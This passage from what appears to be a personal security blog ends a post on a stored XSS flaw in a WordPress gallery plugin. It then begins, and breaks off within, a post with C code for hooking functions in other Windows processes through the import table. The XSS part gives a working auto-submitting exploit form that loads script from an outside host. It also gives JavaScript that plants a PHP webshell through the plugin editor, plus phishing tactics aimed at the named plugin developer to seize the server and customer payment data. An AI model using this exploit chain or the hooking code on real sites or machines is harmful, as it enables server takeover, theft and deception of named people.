            <span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">&quot;xss-test&quot;</span> <span class="na">action=</span><span class="s">&quot;http://localhost/~nikolai/wordpress_pentest/wordpress/wp-admin/index.php?page=settings&amp;post_type=easymediagallery&quot;</span> <span class="na">method=</span><span class="s">&quot;POST&quot;</span><span class="nt">&gt;</span>
                <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;action&quot;</span> <span class="na">value=</span><span class="s">&quot;save&quot;</span> <span class="nt">/&gt;</span>
                <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;easymedia_style_pattern&quot;</span> <span class="na">value=</span><span class="s">&#39;pattern-01.png&quot; name=&quot;easymedia_style_pattern&quot; id=&quot;easymedia_style_pattern&quot; /&gt;&lt;script src=http://somehackedserver.com/plugin-loader.js&gt;//Nothin here&lt;/script&gt;&#39;</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;/form&gt;</span>

            <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span><span class="nt">&gt;</span>
                <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;xss-test&#39;</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
            <span class="nt">&lt;/script&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></div>


<p>Of course the appropriate values have to be set to match the victims
server credentials. So if we wanted to target the plugin developer, we
would just use the URL in the POST form</p>
<div class="highlight"><pre>http://ghozylab.com/wp-admin/index.php?page=settings&amp;post_type=easymediagallery
</pre></div>


<p>and we would host the javascript payload on a hacked server. But wait,
the above POC has the payload</p>
<div class="highlight"><pre>pattern-01.png&quot; name=&quot;easymedia_style_pattern&quot; id=&quot;easymedia_style_pattern&quot; /&gt;<span class="nt">&lt;script</span> <span class="na">src=</span><span class="s">http://somehackedserver.com/plugin-loader.js</span><span class="nt">&gt;</span>//Nothin here<span class="nt">&lt;/script&gt;</span>
</pre></div>


<p>Now that we can execute arbitrary javascript code in the context of the
admin, what can we possibly do? Well, we can gain remote code execution.
That's the worst outcome of any possible web hack attack, because it
allows us to gain a foothold on the server. Possible scenarios from
there: Steal the databases (money), try to gain root privileges on the
server in order to completely own it. But this is usually kinda hard.</p>
<p>Anyways, the javascript that is loaded by the stored XSS modifies the
standard plugin hello.php (hello dolly plugin, it's installed by
default) and adds a PHP webshell to it.</p>
<p>You want to see the code how I managed to to implement it?</p>
<p>It's rather straightforward and there are probably more elegant ways,
such as using jQuery. Keep in mind that the URL is set to my local
pentest server, except ALERT_URL, this is just made up. In the real
world, you'd substitute the urls to a hacked server that you own and
from which you start and execute your attacks.</p>
<div class="highlight"><pre> <span class="cm">/* </span>
<span class="cm"> * Copyright: Nikolai Tschacher.</span>
<span class="cm"> * Site: incolumitas.com</span>
<span class="cm"> * Easy as pie.</span>
<span class="cm"> * What: Use this code when you found a stored XSS in a wordpress plugin to gain RCE.</span>
<span class="cm"> * How: A wordpress admin needs to run this code in his browser with a valid session id.</span>
<span class="cm"> * Idea: Mofify the flash-album-gallery plugin via wordpress admin panel.</span>
<span class="cm"> * </span>
<span class="cm"> * Note: This is actually nothing new. It&#39;s just one of many ways to gain RCE</span>
<span class="cm"> *       if you have a stored XSS in a wordpress session.</span>
<span class="cm"> */</span>

<span class="c1">// Without php tags</span>
<span class="c1">// HTML meta chars are in character entity references format.</span>
<span class="kd">var</span> <span class="nx">EXPLOIT_CODE</span> <span class="o">=</span> <span class="s2">&quot;\nif (isset($_GET[&amp;#039;cmd&amp;#039;])&amp;amp;&amp;amp; !empty($_GET[&amp;#039;cmd&amp;#039;])){ echo &amp;#039;&lt;pre&gt;&amp;#039;;system($_GET[&amp;#039;cmd&amp;#039;]);echo &amp;#039;&lt;/pre&gt;&amp;#039;; }&quot;</span><span class="p">;</span>

<span class="c1">// TARGET SETTINGS. Set stuff here.</span>
<span class="kd">var</span> <span class="nx">TARGET_WP_PATH</span> <span class="o">=</span> <span class="s2">&quot;http://localhost/wordpress&quot;</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">PLUGIN_EDITOR_URL</span> <span class="o">=</span> <span class="nx">TARGET_WP_PATH</span> <span class="o">+</span> <span class="s2">&quot;/wp-admin/plugin-editor.php&quot;</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">PLUGIN_EDIT_URL</span> <span class="o">=</span> <span class="nx">PLUGIN_EDITOR_URL</span> <span class="o">+</span> <span class="s2">&quot;?file=flash-album-gallery/flag.php&quot;</span><span class="p">;</span>


<span class="kd">function</span> <span class="nx">getXMLHttpRequestObject</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">ref</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">XMLHttpRequest</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// For recent browsers.</span>
        <span class="nx">ref</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">ActiveXObject</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// Older IE 6,7,8</span>
        <span class="nx">ref</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">&quot;MSXML2.XMLHTTP.3.0&quot;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">ref</span><span class="p">;</span>
<span class="p">}</span>

<span class="cm">/* Extract the nonce */</span>
<span class="kd">function</span> <span class="nx">exploit</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>

    <span class="nx">req</span> <span class="o">=</span> <span class="nx">getXMLHttpRequestObject</span><span class="p">();</span>
    <span class="nx">req</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">res</span> <span class="o">=</span> <span class="sr">/name=&quot;_wpnonce&quot;\svalue=\&quot;[a-z0-9]{10}\&quot;/</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">nonce</span> <span class="o">=</span>  <span class="sr">/[a-z0-9]{10}/</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">res</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="c1">// The sites not available. Maybe the plugin is not installed?!</span>
                <span class="nx">nonce</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>

            <span class="p">}</span>
            <span class="nx">modify_plugin</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">responseText</span><span class="p">,</span> <span class="nx">nonce</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nx">req</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="nx">PLUGIN_EDIT_URL</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
    <span class="nx">req</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
<span class="p">}</span>

<span class="cm">/* Modify the plugin with malicous code with plugin editor */</span>
<span class="kd">function</span> <span class="nx">modify_plugin</span><span class="p">(</span><span class="nx">responseText</span><span class="p">,</span> <span class="nx">nonce</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// Get the plugin code</span>
    <span class="c1">// On each wordpress plugin edit site, there&#39;s just one textarea tag.</span>
    <span class="c1">// The plugin code itself lies between the textarea tags.</span>
    <span class="c1">// These regexes aren&#39;t really good.</span>
    <span class="kd">var</span> <span class="nx">startIndex</span> <span class="o">=</span> <span class="nx">responseText</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/&lt;textarea.*?name=&quot;newcontent&quot;.*?&gt;/</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">stopIndex</span> <span class="o">=</span> <span class="nx">responseText</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/&lt;\/textarea&gt;/</span><span class="p">);</span>
    <span class="nx">pluginCode</span> <span class="o">=</span> <span class="nx">responseText</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="nx">startIndex</span><span class="p">.</span><span class="nx">index</span><span class="o">+</span><span class="nx">startIndex</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">length</span><span class="p">,</span> <span class="nx">stopIndex</span><span class="p">.</span><span class="nx">index</span><span class="p">);</span>

    <span class="c1">// add our exploit code at the beginning of the plugin after the &quot;// Stop direct call&quot; comment.</span>
    <span class="k">if</span> <span class="p">(</span><span class="sr">/((\/){2}\sStop\sdirect\scall)/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">pluginCode</span><span class="p">))</span> <span class="p">{</span>
        <span class="nx">pluginCode</span> <span class="o">=</span> <span class="nx">pluginCode</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/((\/){2}\sStop\sdirect\scall)/</span><span class="p">,</span> <span class="s2">&quot;$1&quot;</span> <span class="o">+</span> <span class="nx">EXPLOIT_CODE</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="c1">// Let&#39;s go for the first line after the obligatory wp plugin comment and lets use the closing comment</span>
        <span class="c1">// characters */ as needle as a fallback.</span>
        <span class="nx">pluginCode</span> <span class="o">=</span> <span class="nx">pluginCode</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/^(\*\/)/m</span><span class="p">,</span> <span class="s2">&quot;$1&quot;</span> <span class="o">+</span> <span class="s2">&quot;\n&quot;</span> <span class="o">+</span> <span class="nx">EXPLOIT_CODE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// We need to consider that the plugin code in this state is making use of Character entity references</span>
    <span class="c1">// for all html meta characters like &quot; &#39; &lt; &gt; &amp; \ to avoid them of being interepreted as markup.</span>
    <span class="c1">// We need to replace them with their &quot;real&quot; characters, before we send the plugin as post data.</span>
    <span class="nx">pluginCode</span> <span class="o">=</span> <span class="nx">removeCharEntityReferences</span><span class="p">(</span><span class="nx">pluginCode</span><span class="p">);</span>

    <span class="c1">// Ready to build our POST request</span>
    <span class="nx">preq</span> <span class="o">=</span> <span class="nx">getXMLHttpRequestObject</span><span class="p">();</span>
    <span class="nx">preq</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">preq</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="nx">preq</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">successPattern</span> <span class="o">=</span> <span class="sr">/File\sedited\ssuccessfully./</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">successPattern</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">preq</span><span class="p">.</span><span class="nx">responseText</span><span class="p">))</span>
                <span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;Done.&quot;</span><span class="p">);</span>
                <span class="c1">// Notify the attacker that the exploit has been spawned.</span>
            <span class="k">else</span>
                <span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;Nope.&quot;</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">};</span>
    <span class="nx">preq</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;POST&quot;</span><span class="p">,</span> <span class="nx">PLUGIN_EDITOR_URL</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
    <span class="nx">preq</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">,</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span><span class="p">);</span>

    <span class="nx">pd</span> <span class="o">=</span> <span class="p">{</span>
        <span class="nx">_wpnonce</span><span class="o">:</span> <span class="nx">nonce</span><span class="p">,</span>
        <span class="nx">_wp_http_referer</span><span class="o">:</span> <span class="nx">PLUGIN_EDIT_URL</span> <span class="o">+</span> <span class="s2">&quot;&amp;a=te&amp;scrollto=0&quot;</span><span class="p">,</span>
        <span class="nx">a</span><span class="o">:</span> <span class="s2">&quot;&quot;</span><span class="p">,</span>
        <span class="nx">scrollto</span><span class="o">:</span> <span class="s2">&quot;192&quot;</span><span class="p">,</span>
        <span class="nx">newcontent</span><span class="o">:</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">pluginCode</span><span class="p">),</span>
        <span class="nx">action</span><span class="o">:</span> <span class="s2">&quot;update&quot;</span><span class="p">,</span>
        <span class="nx">file</span><span class="o">:</span> <span class="s2">&quot;flash-album-gallery/flag.php&quot;</span><span class="p">,</span>
        <span class="nx">plugin</span><span class="o">:</span> <span class="s2">&quot;flash-album-gallery/flag.php&quot;</span><span class="p">,</span>
        <span class="nx">submit</span><span class="o">:</span> <span class="s2">&quot;Update+File&quot;</span>
    <span class="p">};</span>
    <span class="c1">// Build the post data.</span>
    <span class="nx">postdata</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">key</span> <span class="k">in</span> <span class="nx">pd</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">postdata</span> <span class="o">+=</span> <span class="p">(</span><span class="nx">key</span> <span class="o">+</span> <span class="s2">&quot;=&quot;</span> <span class="o">+</span> <span class="nx">pd</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;&amp;&quot;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nx">postdata</span> <span class="o">=</span> <span class="nx">postdata</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">postdata</span><span class="p">.</span><span class="nx">length</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// rstrip the last &amp;</span>
    <span class="nx">preq</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">postdata</span><span class="p">);</span>
<span class="p">}</span>

<span class="cm">/*</span>
<span class="cm"> * Removes the HTML char entity references for the HTML meta characters.</span>
<span class="cm"> */</span>
<span class="kd">function</span> <span class="nx">removeCharEntityReferences</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">((</span><span class="k">typeof</span> <span class="nx">data</span><span class="p">)</span> <span class="o">!==</span> <span class="s2">&quot;string&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nx">TypeError</span><span class="p">(</span><span class="s2">&quot;data needs to be a string&quot;</span><span class="p">);</span>
        <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="nx">data</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&amp;quot;/g</span><span class="p">,</span> <span class="s2">&quot;\&quot;&quot;</span><span class="p">);</span>
    <span class="nx">data</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&amp;#039;/g</span><span class="p">,</span> <span class="s2">&quot;&#39;&quot;</span><span class="p">);</span>
    <span class="nx">data</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&amp;lt;/g</span><span class="p">,</span> <span class="s2">&quot;&lt;&quot;</span><span class="p">);</span>
    <span class="nx">data</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&amp;gt;/g</span><span class="p">,</span> <span class="s2">&quot;&gt;&quot;</span><span class="p">);</span>
    <span class="nx">data</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&amp;amp;/g</span><span class="p">,</span> <span class="s2">&quot;&amp;&quot;</span><span class="p">);</span>

    <span class="k">return</span> <span class="nx">data</span><span class="p">;</span>
<span class="p">}</span>

<span class="nx">exploit</span><span class="p">();</span>
</pre></div>


<h3>How dangrous is the vulnerability?</h3>
<p>I'd say such security holes are <strong>very dangerous</strong>.</p>
<p>Of course you need a minimal social engineering effort in order to make
the victim visit your attacking site that incorporates the auto
submittable form which in turn triggers the XSS. Additionaly, you need
to ensure that the victim possesses valid admin cookies of his wordpress
site. But there are ways to increase the likelihood that he has a valid
admin session when you attack him (Or better: When he visits the
attacking site).</p>
<p>For example here are some ways to deliver the attack:</p>
<ul>
<li>Post a comment on the target site. Then place a URL of your
    attacking site within the comment. The victim admin will only see
    the comment when he is logged in to approve or deny the publishing
    of your comment. Hence he <em>must</em> have a valid admin session. So when
    he clicks on the link: Boom, the server is completely fucked up!</li>
<li>Attack the author of the plugin. It is very likely that they have
    the most recent version (And thus the vulnerability) installed on
    the server. Write a email and feign a little issue with the
    <em>elsewhere very cool and nice plugin</em>. Explain that your purchased
    the PRO version of the plugin and that you experience issues with
    some functionaliy in the administration form (This forces the plugin
    author to falsify whether he has the same issues on his site, which
    tricks him into loggin in and obtaining the necessary admin cookie).
    Then add a detailed and plausible error explanation on your
    attacking site, where the trigger is hidden (See POC above). The
    victim visits and boom you own the server and all the financial
    credits of all purchases made by the customers (which are most
    likely on the same site as the plugin publishers). If you own the
    plugin authors website and you managed to exploit it in a stealthy
    way, you can continue spread male-ware from there.</li>
</ul>
<p>The only drawback I currently experienced in my tests, is that the
attacking form will make the victim visit his own admin menu. There is
no way to load the page hidden and execute the javascript without
changing the current screen of the browser to the admin form of the
victim, because in most cases wordpress (or sometimes the webserver)
sends automatically the header</p>
<div class="highlight"><pre>X-Frame-Options SAMEORIGIN;
</pre></div>


<p>which <a href="https://developer.mozilla.org/en-US/docs/HTTP/X-Frame-Options" title="x-frame-header prevents stealth xss">cripples all attempts to load the dom in a hidden
iframe</a>.
Thus, I cannot see a proper way to attack a victim without making him to
notice that something <em>odd</em> is going on. The plugin author would begin
to ask himself: Why the hell get I redirected to my own administration
menu of my blog when I just clicked on the link given by this clueless
customer that so desperately needs help with his little issue? Is there
something fishy? Am I being tricked?</p>
<p>But usually, then it's to late and I already have shell access to the
server.</p>
<p>So there needs to be done further research. In particular: do you have a
idea to execute the attack more stealthy, such that the POST request
that causes the XSS doesn't inevitably send the victim to the sink
source of the tainted data?</p>
<p>Please send me a comment if you have a idea!</p>
<p>Cheers</p>
  </div>
  <hr />
</article>
<article>
  <header>
    <h2><a href="/iat-hooking.html#iat-hooking">IAT hooking</a></h2>
    <p>
      Posted on Sa 07 Dezember 2013 in <a href="/category/c.html">C</a>
      &#8226; Tagged with
      <a href="/tag/c.html">C</a>,      <a href="/tag/hooking.html">Hooking</a>,      <a href="/tag/programming.html">Programming</a>,      <a href="/tag/security.html">Security</a>,      <a href="/tag/windows.html">Windows</a>,      <a href="/tag/nt.html">Nt</a>,      <a href="/tag/assembler.html">Assembler</a>,      <a href="/tag/iat.html">Iat</a>    </p>
  </header>
  <div>
      <h3>What</h3>
<p>I just rummaged through my old hard disk and suddenly stumbled across
some old C sources from around a year ago when I played with IAT hooking
on windows 7. I will not explain much, but I made the bottom code around
a year ago (Thus, in 2012) and it should be able to hook any code
(depicted as the handler here) into running processes via the IAT. I
suppose the code is not working properly, but it gives a good picture of
how an IAT hooking approach might look like.</p>
<h3><a href="http://www.youtube.com/watch?v=432PZ9787n0">What'll you do?</a></h3>
<p>Hopefully I'll find some time and motivation (or more appropriate:
discipline) to update the little library and finally complete it. Maybe
I will also make it compatible with windows 8, but I assume it's not
really different from windows 7 (Hell I don't know anything about the
windows API)...</p>
<div class="highlight"><pre><span class="cp">#include &quot;main.h&quot;</span>

<span class="cm">/* </span>
<span class="cm"> * Implements a little library to Hook the WinApi on running programs.</span>
<span class="cm"> * Furthermore, the API provides functions too find code caves and little hook templates for the most common scenarios</span>
<span class="cm"> * when we use hooking: Intercept function parameters and monitor output...</span>
<span class="cm"> * Supports both, 32 and 64 bit Windows XP to Windows 7. The code is pretty bloated, because</span>
<span class="cm"> * I intended to catch as many errors as possbible and included some debug stuff. This hooking &#39;library&#39; shall be reliable.</span>
<span class="cm"> * It provides just IAT hooking, no other code injections.</span>
<span class="cm"> */</span>

<span class="kt">int</span>
<span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">;</span>
    <span class="n">HOOK_CONTEXT</span> <span class="o">*</span><span class="n">pHookContext</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">pid</span><span class="p">;</span>
    <span class="n">BOOL</span> <span class="n">bSuccess</span><span class="p">;</span>

    <span class="kt">char</span><span class="o">*</span> <span class="n">handler</span> <span class="o">=</span>
        <span class="s">&quot;</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="s">&quot;</span>
        <span class="s">&quot;</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="s">&quot;</span>
        <span class="s">&quot;</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="s">&quot;</span><span class="p">;</span>

<span class="cp">#ifdef _WIN64</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[i] 64 architecture detected</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[-] Sorry, currently not supported</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
<span class="cp">#endif</span>

<span class="cp">#ifdef _WIN32</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[i] 32 architecture detected</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="cp">#endif</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">pid</span> <span class="o">=</span> <span class="n">GetCurrentProcessId</span><span class="p">();</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[i] using current process id as target</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&gt;=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">pid</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Usage: %s PID&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="cm">/* Try to open the specified process */</span>
    <span class="n">hProcess</span> <span class="o">=</span> <span class="n">OpenProcess</span>
    <span class="p">(</span>
        <span class="n">PROCESS_QUERY_INFORMATION</span> <span class="o">|</span>
        <span class="n">PROCESS_VM_OPERATION</span> <span class="o">|</span>
        <span class="n">PROCESS_VM_READ</span> <span class="o">|</span>
        <span class="n">PROCESS_VM_WRITE</span> <span class="o">|</span>
        <span class="n">PROCESS_SET_QUOTA</span><span class="p">,</span>
        <span class="n">FALSE</span><span class="p">,</span>
        <span class="n">pid</span>
    <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">hProcess</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[!] OpenProcess() failed with %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[i] Remote Process with PID=%d opened</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="cm">/* Hook shit */</span>
    <span class="n">pHookContext</span> <span class="o">=</span> <span class="n">HookFunction</span>
    <span class="p">(</span>
        <span class="n">hProcess</span><span class="p">,</span>
        <span class="s">&quot;USER32.DLL&quot;</span><span class="p">,</span>
        <span class="s">&quot;MessageBoxA&quot;</span><span class="p">,</span>
        <span class="n">handler</span><span class="p">,</span>
        <span class="n">strlen</span><span class="p">(</span><span class="n">handler</span><span class="p">)</span>
    <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">pHookContext</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[!] Hooking failed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[i] hooked</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>


    <span class="n">Sleep</span><span class="p">(</span><span class="mi">50000</span><span class="p">);</span> <span class="c1">// Sleep 60 seconds. Try now the new behaviour of the function :)</span>

    <span class="n">bSuccess</span> <span class="o">=</span> <span class="n">ReleaseHook</span>
    <span class="p">(</span>
        <span class="n">hProcess</span><span class="p">,</span>
        <span class="n">pHookContext</span>
    <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bSuccess</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[!] Release Hook failed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[i] Hook released</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>

    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcess</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_SUCCESS</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// =============================================================================================</span>

<span class="n">DWORD</span>
<span class="nf">FindRemotePEB</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">HMODULE</span> <span class="n">hNTDll</span><span class="p">;</span>
    <span class="n">FARPROC</span> <span class="n">fpNtQueryInformationProcess</span><span class="p">;</span>
    <span class="n">NTSTATUS</span> <span class="n">status</span><span class="p">;</span>
    <span class="n">PROCESS_BASIC_INFORMATION</span> <span class="n">procBasicInformation</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">returnLength</span><span class="p">;</span>

    <span class="n">hNTDll</span> <span class="o">=</span> <span class="n">LoadLibraryA</span><span class="p">(</span><span class="s">&quot;ntdll&quot;</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">hNTDll</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;LoadLibraryA() failed with %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">fpNtQueryInformationProcess</span> <span class="o">=</span> <span class="n">GetProcAddress</span>
